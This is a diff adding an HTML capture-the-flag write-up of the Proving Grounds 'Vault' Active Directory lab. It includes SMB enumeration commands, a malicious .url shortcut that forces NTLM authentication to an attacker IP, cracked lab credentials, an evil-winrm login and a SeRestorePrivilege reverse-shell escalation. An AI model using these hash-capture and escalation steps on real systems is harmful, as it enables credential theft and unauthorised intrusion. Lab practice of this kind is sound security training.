@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="description" content="Proving Grounds Vault Writeup - Rachel Murphy" />
+  <title>PG: Vault | Rachel Murphy</title>
+
+  <!-- Base site styling -->
+  <link rel="stylesheet" href="/assets/css/writeups.css">
+  <style>
+    /* small local adjustments for screenshots & code blocks */
+    img.screenshot {
+      max-width: 100%;
+      margin: 0.75rem 0;
+      border: 2px solid #39ff14;
+      border-radius: 6px;
+      display: block;
+    }
+    .code-block { margin: 1rem 0; }
+    pre { background: rgba(15,23,36,0.9); padding: 1rem; border-radius: 6px; overflow-x: auto; }
+    .meta { color: #cbd5e1; font-size: 0.95rem; margin-bottom: .5rem; }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <div class="wrap">
+      <h1>Vault — Writeup</h1>
+      <p class="meta">Proving Grounds — Active Directory</p>
+      <nav>
+        <ul class="main-nav">
+          <li><a href="/index.html">Home</a></li>
+          <li><a href="/writeups/index.html">Writeups</a></li>
+          <li><a href="/cheatsheets/cheatsheet.html">Cheatsheets</a></li>
+          <li><a href="/tools/index.html">Tools</a></li>
+          <li><a href="/about.html">About</a></li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap">
+    <!-- Machine summary / description -->
+    <section class="machine-summary">
+      <h2>Machine Overview</h2>
+      <p><strong>Difficulty:</strong> Hard</p>
+      <p><strong>Platform:</strong> Offensive Security Proving Grounds</p>
+      <p><strong>Description:</strong> Vault is a Windows-based Active Directory machine built to challenge a penetration tester’s ability to enumerate, exploit, and escalate privileges within a domain. Initial access hinges on capturing a Net-NTLM hash from a misconfigured SMB share, while escalation paths include abusing SeRestorePrivilege or misconfigured GPOs to gain SYSTEM or domain administrator rights. It’s a realistic multi-step attack chain ideal for OSCP preparation.</p>
+
+      <h3>What makes Vault notable</h3>
+      <p>Active Directory environment: Vault requires deep AD enumeration and exploitation knowledge. Realistic attack chain: client-side hash capture, privilege escalation, and multiple lateral movement paths. OSCP prep: Like Nagoya and Hokkaido, Vault mimics corporate networks and is frequently recommended for exam practice.</p>
+    </section>
+
+    <!-- Example walkthrough structure -->
+    <section>
+      <h2>Enumeration with Nmap</h2>
+      <p>Scanned the target for open ports and services:</p>
+      <div class="code-block">
+        <pre>sudo nmap -sV -sC 192.168.120.172 -oN nmap-vault</pre>
+      </div>
+      <img src="../images/Pasted image 20250707232105.png" alt="Nmap results" class="screenshot">
+      <p>Added <code>vault.offsec</code> and <code>dc.vault.offsec</code> to <code>/etc/hosts</code>.</p>
+    </section>
+
+    <section>
+      <h2>SMB Enumeration</h2>
+      <p>Enumerated SMB shares and discovered a writable <code>DocumentsShare</code>:</p>
+      <div class="code-block">
+        <pre>nxc smb 192.168.120.172 -u '.' -p '.' --shares</pre>
+      </div>
+      <img src="../images/Pasted image 20250707235059.png" alt="SMB enumeration" class="screenshot">
+    </section>
+
+    <section>
+      <h2>Capturing Hashes from SMB</h2>
+      <p>Uploaded a malicious <code>.url</code> file to the share to force the host to authenticate to our Responder listener:</p>
+      <div class="code-block">
+<pre>[InternetShortcut]
+URL=Random_nonsense
+WorkingDirectory=Flibertygibbit
+IconFile=\\192.168.45.152\%USERNAME%.icon
+IconIndex=1</pre>
+      </div>
+      <img src="../images/Pasted image 20250708003340.png" alt="Captured hash" class="screenshot">
+      <p>Cracked the captured NTLMv2 hash to obtain <code>anirudh:SecureHM</code>.</p>
+    </section>
+
+    <section>
+      <h2>Initial Access with Evil-WinRM</h2>
+      <p>Logged into the machine using the cracked credentials:</p>
+      <div class="code-block">
+        <pre>evil-winrm -i 192.168.120.172 -u 'anirudh' -p 'SecureHM'</pre>
+      </div>
+      <img src="../images/Pasted image 20250708004052.png" alt="Initial access" class="screenshot">
+    </section>
+
+    <section>
+      <h2>Privilege Escalation</h2>
+      <p>Enumerated privileges and exploited <code>SeRestorePrivilege</code> to run a reverse shell payload:</p>
+      <div class="code-block">
+        <pre>.\SeRestoreAbuse.exe C:\Users\anirudh\Desktop\reverse.exe</pre>
+      </div>
+      <img src="../images/Pasted image 20250708011154.png" alt="Privilege escalation" class="screenshot">
+      <p>Got SYSTEM on the listener, completing the compromise.</p>
+      <img src="../images/Pasted image 20250708011227.png" alt="SYSTEM access" class="screenshot">
+    </section>
+
+  </main>
+
+  <footer>
+    <p>© Rachel Murphy 2025 | <a href="https://github.com/rachhavoc">GitHub</a></p>
+    <p><a href="/writeups/index.html">Back to Writeups</a> | <a href="../../index.html">Home</a></p>
+  </footer>
+
+</body>
+</html>
